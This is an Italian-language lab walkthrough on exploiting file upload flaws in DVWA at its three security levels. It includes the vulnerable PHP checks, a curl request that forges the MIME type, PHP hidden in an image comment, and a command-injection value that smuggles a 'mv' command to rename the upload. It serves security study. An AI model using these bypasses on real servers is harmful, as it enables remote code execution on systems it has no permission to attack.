## File upload

- https://www.owasp.org/index.php/Unrestricted_File_Upload
- https://blogs.securiteam.com/index.php/archives/1268
- https://www.acunetix.com/websitesecurity/upload-forms-threat/

L'attaccante carica un file a suo piacimento per poi eseguirlo in altro modo.
L'attaccante può sovrascrivere file già presenti sul server sfruttando path e filename estratti dai metadati HTTP.
Si hanno problemi diversi se dimensione o contenuto del file vengono manipolati.

Esempi:

- file .jsp per eseguire codice come utente web
- file .gif per sfruttare una vulnerabilità nella image library
- file di grosse dimensioni per causare un DoS
- file con path adatto a sovrascrivere file critici
- file contenenti tag che ne causano l'esecuzione
- file .rar per essere analizzati dall'antivirus vulnerabile



### File Upload - Low

```
// Where are we going to be writing to?
$target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
$target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
```

Exploit:

- crea il file `fu_low.php` contenente `<?php phpinfo(); ?>`
- carica il file tramite la funzione esposta dall'applicazione
- accedi a `http://172.17.0.2/hackable/uploads/fu_low.php`

### File Upload - Medium

```
// File information
$uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];

// Is it an image?
if( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) { ... }
```

Il valore di `$_FILES[ 'uploaded' ][ 'type' ]` può essere alterato creando un'apposita richiesta POST HTTP.

Exploit:

- crea il file `fu_medium.php` contenente `<?php phpinfo(); ?>`
- lancia (con `$1` PHPSESSID valido):

```
curl -v \
	--cookie "PHPSESSID=$1; security=medium" \
	-F "MAX_FILE_SIZE=100000" \
	-F "Upload=Upload" \
	-F "uploaded=@$filename; type=image/png" \
	http://172.17.0.2/vulnerabilities/upload/
```

- accedi a `http://172.17.0.2/hackable/uploads/fu_medium.php`

### File Upload - High

```
// File information
$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);
$uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ]; 

// Is it an image?
if( ( strtolower( $uploaded_ext ) == "jpg" || 
	strtolower( $uploaded_ext ) == "jpeg" || 
		strtolower( $uploaded_ext ) == "png" ) &&
				getimagesize( $uploaded_tmp ) ) { ... }
```

strrpos — Find the position of the last occurrence of a substring in a string

getimagesize — Get the size of an image  
On failure, FALSE is returned. 

Exploit:

- crea un'immagine `fu_high.jpg`, aprila con GIMP ed esportala
- nell'export aggiungi il commento `<?php phpinfo() ?>`
- carica l'immagine tramite la funzione esposta dall'applicazione
- sfrutta la vulnerabilità di Command Injection per rinominare il file `fu_high.jpg` -> `fu_high.php` (Exploit: `8.8.8.8 |mv /var/www/html/hackable/uploads/fu_high.jpg /var/www/html/hackable/uploads/fu_high.php`)
- accedi a `http://172.17.0.2/hackable/uploads/fu_high.php`

